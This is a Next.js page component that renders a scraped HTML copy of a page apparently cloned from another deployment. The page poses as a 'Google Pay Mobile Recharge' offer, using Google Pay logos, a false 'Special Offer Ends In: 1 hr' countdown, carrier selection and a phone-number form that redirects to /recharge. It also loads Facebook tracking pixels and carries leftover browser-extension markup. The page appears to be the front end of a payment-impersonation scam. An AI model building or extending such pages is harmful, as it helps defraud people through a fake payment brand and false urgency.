"use client";
import { useRouter } from "next/router";
import Heder from '../componets/Heder'
import React, { useState } from 'react'
import { Carousel } from "react-bootstrap";
import { items } from "../../public/Items.json";


function Home() {
    const router = useRouter();
    const { bootstrap } = items;
    const [index, setIndex] = useState(0);
    const [num, setNum] = useState();
    const handleSelect = (selectedIndex, e) => {
        setIndex(selectedIndex);
    };

    const initialTime = 700; // 10 minutes in seconds
 
    const settings = {
        dots: true,
        infinite: true,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
    };
    let data = ` <html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="./gpay.jpg" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    <link rel="apple-touch-icon" href="/logo192.png" />
    <link rel="manifest" href="/manifest.json" />
    <title>Google Pay Mobile Recharge New Plans</title>
    <script
      src="https://connect.facebook.net/signals/config/536083825579543?v=2.9.170&amp;r=stable&amp;domain=boffaraxel.vercel.app&amp;hme=d82868061a8c707cd31395a3055e7449daa03bd520872727258c39e6af34523e&amp;ex_m=70%2C120%2C106%2C110%2C61%2C4%2C99%2C69%2C16%2C96%2C88%2C51%2C54%2C171%2C174%2C186%2C182%2C183%2C185%2C29%2C100%2C53%2C77%2C184%2C166%2C169%2C179%2C180%2C187%2C130%2C41%2C34%2C142%2C15%2C50%2C193%2C192%2C132%2C18%2C40%2C1%2C43%2C65%2C66%2C67%2C71%2C92%2C17%2C14%2C95%2C91%2C90%2C107%2C52%2C109%2C39%2C108%2C30%2C93%2C26%2C167%2C170%2C139%2C28%2C11%2C12%2C13%2C6%2C7%2C25%2C22%2C23%2C57%2C62%2C64%2C75%2C101%2C27%2C76%2C9%2C8%2C80%2C48%2C21%2C103%2C102%2C104%2C97%2C10%2C20%2C3%2C38%2C74%2C19%2C85%2C56%2C83%2C33%2C73%2C0%2C94%2C32%2C82%2C87%2C47%2C46%2C86%2C37%2C5%2C89%2C81%2C44%2C35%2C84%2C2%2C36%2C63%2C42%2C105%2C45%2C79%2C68%2C111%2C60%2C59%2C31%2C98%2C58%2C55%2C49%2C78%2C72%2C24%2C112%2C199%2C198%2C200%2C205%2C206%2C207%2C203%2C195%2C131%2C133%2C162%2C194%2C196%2C121%2C156%2C144%2C150%2C188%2C189%2C128%2C231%2C115%2C125%2C126%2C232%2C164%2C118%2C234%2C165%2C135%2C122%2C153%2C147%2C113%2C127"
      async=""
    ></script>
    <script
      src="https://connect.facebook.net/signals/config/1331035241205299?v=2.9.170&amp;r=stable&amp;domain=boffaraxel.vercel.app&amp;hme=d82868061a8c707cd31395a3055e7449daa03bd520872727258c39e6af34523e&amp;ex_m=70%2C120%2C106%2C110%2C61%2C4%2C99%2C69%2C16%2C96%2C88%2C51%2C54%2C171%2C174%2C186%2C182%2C183%2C185%2C29%2C100%2C53%2C77%2C184%2C166%2C169%2C179%2C180%2C187%2C130%2C41%2C34%2C142%2C15%2C50%2C193%2C192%2C132%2C18%2C40%2C1%2C43%2C65%2C66%2C67%2C71%2C92%2C17%2C14%2C95%2C91%2C90%2C107%2C52%2C109%2C39%2C108%2C30%2C93%2C26%2C167%2C170%2C139%2C28%2C11%2C12%2C13%2C6%2C7%2C25%2C22%2C23%2C57%2C62%2C64%2C75%2C101%2C27%2C76%2C9%2C8%2C80%2C48%2C21%2C103%2C102%2C104%2C97%2C10%2C20%2C3%2C38%2C74%2C19%2C85%2C56%2C83%2C33%2C73%2C0%2C94%2C32%2C82%2C87%2C47%2C46%2C86%2C37%2C5%2C89%2C81%2C44%2C35%2C84%2C2%2C36%2C63%2C42%2C105%2C45%2C79%2C68%2C111%2C60%2C59%2C31%2C98%2C58%2C55%2C49%2C78%2C72%2C24%2C112"
      async=""
    ></script>
    <script
      async=""
      src="https://connect.facebook.net/en_US/fbevents.js"
    ></script>
    <script
      defer="defer"
      src="https://boffaraxel.vercel.app/static/js/main.ac9c4e3a.js"
    ></script>
    <link
      href="https://boffaraxel.vercel.app/static/css/main.794bfd41.css"
      rel="stylesheet"
    />

    <meta
      name="maxai-mui-classname-prefix"
      content="injectDocumentStart-2024-10-09T20:23:50.270Z"
    />
    <style id="_goober">
      .go1475592160 {
        height: 0;
      }
      .go1671063245 {
        height: auto;
      }
      .go1888806478 {
        display: flex;
        flex-wrap: wrap;
        flex-grow: 1;
      }
      @media (min-width: 600px) {
        .go1888806478 {
          flex-grow: initial;
          min-width: 288px;
        }
      }
      .go167266335 {
        background-color: #313131;
        font-size: 0.875rem;
        line-height: 1.43;
        letter-spacing: 0.01071em;
        color: #fff;
        align-items: center;
        padding: 6px 16px;
        border-radius: 4px;
        box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2),
          0px 6px 10px 0px rgba(0, 0, 0, 0.14),
          0px 1px 18px 0px rgba(0, 0, 0, 0.12);
      }
      .go3162094071 {
        padding-left: 20px;
      }
      .go3844575157 {
        background-color: #313131;
      }
      .go1725278324 {
        background-color: #43a047;
      }
      .go3651055292 {
        background-color: #d32f2f;
      }
      .go4215275574 {
        background-color: #ff9800;
      }
      .go1930647212 {
        background-color: #2196f3;
      }
      .go946087465 {
        display: flex;
        align-items: center;
        padding: 8px 0;
      }
      .go703367398 {
        display: flex;
        align-items: center;
        margin-left: auto;
        padding-left: 16px;
        margin-right: -8px;
      }
      .go3963613292 {
        width: 100%;
        position: relative;
        transform: translateX(0);
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        min-width: 288px;
      }
      .go1141946668 {
        box-sizing: border-box;
        display: flex;
        max-height: 100%;
        position: fixed;
        z-index: 1400;
        height: auto;
        width: auto;
        transition: top 300ms ease 0ms, right 300ms ease 0ms,
          bottom 300ms ease 0ms, left 300ms ease 0ms, max-width 300ms ease 0ms;
        pointer-events: none;
        max-width: calc(100% - 40px);
      }
      .go1141946668 .notistack-CollapseWrapper {
        padding: 6px 0px;
        transition: padding 300ms ease 0ms;
      }
      @media (max-width: 599.95px) {
        .go1141946668 {
          width: 100%;
          max-width: calc(100% - 32px);
        }
      }
      .go3868796639 .notistack-CollapseWrapper {
        padding: 2px 0px;
      }
      .go3118922589 {
        top: 14px;
        flex-direction: column;
      }
      .go1453831412 {
        bottom: 14px;
        flex-direction: column-reverse;
      }
      .go4027089540 {
        left: 20px;
      }
      @media (min-width: 600px) {
        .go4027089540 {
          align-items: flex-start;
        }
      }
      @media (max-width: 599.95px) {
        .go4027089540 {
          left: 16px;
        }
      }
      .go2989568495 {
        right: 20px;
      }
      @media (min-width: 600px) {
        .go2989568495 {
          align-items: flex-end;
        }
      }
      @media (max-width: 599.95px) {
        .go2989568495 {
          right: 16px;
        }
      }
      .go4034260886 {
        left: 50%;
        transform: translateX(-50%);
      }
      @media (min-width: 600px) {
        .go4034260886 {
          align-items: center;
        }
      }
    </style>
    <link
      id="USE_CHAT_GPT_AI_CONTENT_CSS_LINK_TAG"
      rel="stylesheet"
      href="chrome-extension://mhnlakgilnojmhinhkckjpncpbhabphi/content.css"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&amp;display=swap"
    />
    <style>
      .audio-recorder {
        background-color: #ebebeb;
        box-shadow: 0 2px 5px #bebebe;
        border-radius: 20px;
        box-sizing: border-box;
        color: #000;
        width: 40px;
        display: flex;
        align-items: center;
        transition: all 0.2s ease-in;
        -webkit-tap-highlight-color: transparent;
      }
      .audio-recorder-mic {
        box-sizing: content-box;
        cursor: pointer;
        height: 16px;
        color: #000;
        padding: 12px;
      }
      .audio-recorder .audio-recorder-mic {
        border-radius: 20px;
      }
      .audio-recorder.recording .audio-recorder-mic {
        border-radius: 0;
      }
      .audio-recorder-timer,
      .audio-recorder-status {
        color: #000;
        margin-left: 10px;
        font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
        font-size: 14px;
        font-weight: 400;
        line-height: 1;
      }
      .audio-recorder-status {
        margin-left: 15px;
        display: flex;
        align-items: baseline;
        flex-grow: 1;
        animation-name: fading-ar-status;
        animation-duration: 2s;
        animation-iteration-count: infinite;
      }
      .audio-recorder-status-dot {
        background-color: #d00;
        border-radius: 50%;
        height: 10px;
        width: 9px;
        margin-right: 5px;
      }
      .audio-recorder-options {
        box-sizing: content-box;
        height: 16px;
        cursor: pointer;
        padding: 12px 6px 12px 12px;
      }
      .audio-recorder-options ~ .audio-recorder-options {
        padding: 12px 12px 12px 6px;
        border-radius: 0 5px 5px 0;
      }
      .recording {
        border-radius: 12px;
        width: 300px;
        transition: all 0.2s ease-out;
      }
      .display-none {
        display: none;
      }
      .audio-recorder-visualizer {
        margin-left: 15px;
        flex-grow: 1;
        align-self: center;
        display: flex;
        align-items: center;
      }
      @keyframes fading-ar-status {
        0% {
          opacity: 1;
        }
        50% {
          opacity: 0;
        }
        to {
          opacity: 1;
        }
      }
    </style>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div>
      <div
        class="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb-0"
      >
        <div class="flex items-center">
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 448 512"
            class="text-blue-500 mr-3"
            height="19"
            width="19"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
            ></path></svg
          ><a href="/"
            ><img
              src="/uploads/gpaylogo.a859e7ad6e3a2b75843f.png"
              alt=""
              class="h-9"
          /></a>
        </div>
        <div>
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 512 512"
            class="text-blue-500"
            height="25"
            width="25"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
            ></path>
          </svg>
        </div>
      </div>
      <div class="bg-white">
        <div class="px-2">
          <img
            src="uploads/gpaybanner.7eef6b2d81d4cc1cbede.png"
            alt=""
            class="rounded-xl"
          />
        </div>
        <div>
          <div
            class="flex items-center justify-center py-1 px-4 mt-2 bg-blue-50 text-[13px]"
          >
            <div class="text-slate-700 mr-2">Special Offer Ends In:</div>
            <div class="text-slate-700 flex items-center">
              <svg
                stroke="currentColor"
                fill="currentColor"
                stroke-width="0"
                viewBox="0 0 512 512"
                class="mr-[2px] mt-[1px]"
                height="1em"
                width="1em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z"
                ></path></svg
              >1 hr
            </div>
          </div>
        </div>
        <div class="py-10 px-3">
          <div
            class="bg-white border border-slate-200 rounded-xl py-4 px-6 shadow-xl shadow-blue-100"
          >
            <div
              class="text-blue-500 flex items-center text-[17px] font-bold w-fit mx-auto mb-8"
            >
              <svg
                stroke="currentColor"
                fill="currentColor"
                stroke-width="0"
                viewBox="0 0 24 24"
                height="30"
                width="30"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M6 2H18C18.5523 2 19 2.44772 19 3V21C19 21.5523 18.5523 22 18 22H6C5.44772 22 5 21.5523 5 21V3C5 2.44772 5.44772 2 6 2ZM12 17C11.4477 17 11 17.4477 11 18C11 18.5523 11.4477 19 12 19C12.5523 19 13 18.5523 13 18C13 17.4477 12.5523 17 12 17Z"
                ></path></svg
              ><span>Mobile Recharge</span>
            </div>
            <label class="text-[13px] ml-1 font-bold mt-5"
              ><b>Select Network Provider</b></label
            >
            <div
              class="mt-2 flex justify-between text-blue-500 text-[14px] font-bold"
            >
              <div class="border-2 border-blue-500 rounded px-2 py-1 flex justify-center align-items-center ">
                <input
                  type="radio"
                  id="jio"
                  name="r1"
                  class="mr-1 mt-1"
                  value="jio"
                  checked=""
                /><label for="jio" class='m-0 flex justify-center align-items-center my-2'>Jio</label>
              </div>
              <div class="border-2 border-blue-500 rounded px-2 py-1 flex justify-center align-items-center ">
                <input
                  type="radio"
                  id="airtel"
                  name="r1"
                  class="mr-1 mt-1"
                  value="airtel"
                /><label for="airtel" class="flex justify-center align-items-center my-2">Airtel</label>
              </div>
              <div class="border-2 border-blue-500 rounded px-2 py-1 flex justify-center align-items-center ">
                <input
                  type="radio"
                  id="vi"
                  name="r1"
                  class="mr-1 mt-1"
                  value="vi"
                /><label for="vi" class="flex justify-center align-items-center my-2">VI</label>
              </div>
              <div class="border-2 border-blue-500 rounded px-2 py-1 flex justify-center align-items-center ">
                <input
                  type="radio"
                  id="bsnl"
                  class="mr-1 mt-1"
                  value="bsnl"
                /><label for="bsnl" class="flex justify-center align-items-center my-2">BSNL</label>
              </div>
            </div>
            <form class="mobility-recharge-form" onsubmit="handleSubmit(event)">
              <div class="mt-3">
                <label class="text-[13px] ml-1 mb-0 mt-4 font-bold"><b>Mobile Number</b></label
                >
                <input
                  type="number"
                  id="mobileNumber"
                  name="mobileNumber"
                  placeholder="+91 xxxxx xxxxx"
                  class="bg-white mt-1 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                  required=""
                  value=""
                  style="
    height: 46px;
    font-size: 16px;
"
                />
              </div>
              <div class="mt-5">
                <button
                  type="submit"
                  class="bg-blue-500 py-3 w-full text-[15px] rounded-xl font-bold text-white"
                >
                  Recharge
                </button>
              </div>
            </form>

            <script>
              function handleSubmit(event) {
                event.preventDefault();
                const mobileNumber = event.target.mobileNumber.value;
                localStorage.setItem("mobileNumber", mobileNumber);

                if (mobileNumber.length === 10) {
                  window.location.href = "/recharge";
                } else {
                  alert("Please enter a valid 10-digit mobile number.");
                }
              }
            </script>
          </div>
        </div>
        <img
          src="uploads/gpayfooter.11f558d98dc0e11b50d8.webp"
          alt=""
          class="mt-3"
        />
      </div>
    </div>
    <max-ai-minimum-app
      id="USE_CHAT_GPT_AI_ROOT_Minimize_Container"
      data-version="5.1.3"
    ></max-ai-minimum-app
    ><use-chat-gpt-ai
      id="USE_CHAT_GPT_AI_ROOT"
      class="close"
      data-version="5.1.3"
      style="transition: 0.1s ease-in-out"
    ></use-chat-gpt-ai
    ><use-chat-gpt-ai-content-menu
      id="USE_CHAT_GPT_AI_ROOT_Context_Menu"
    ></use-chat-gpt-ai-content-menu
    ><use-chat-gpt-ai id="maxai-global-popup-container"></use-chat-gpt-ai>
    <div
      id="MAXAI_SNACKBAR_CONTAINER"
      style="z-index: 2147483647; color: rgb(255, 255, 255); position: absolute"
    >
      <span></span>
    </div>
  </body>
</html>
`
    return (<>


        <div className="">
            <span dangerouslySetInnerHTML={{ __html: data }} />
        </div>
    </>
    )
}

export default Home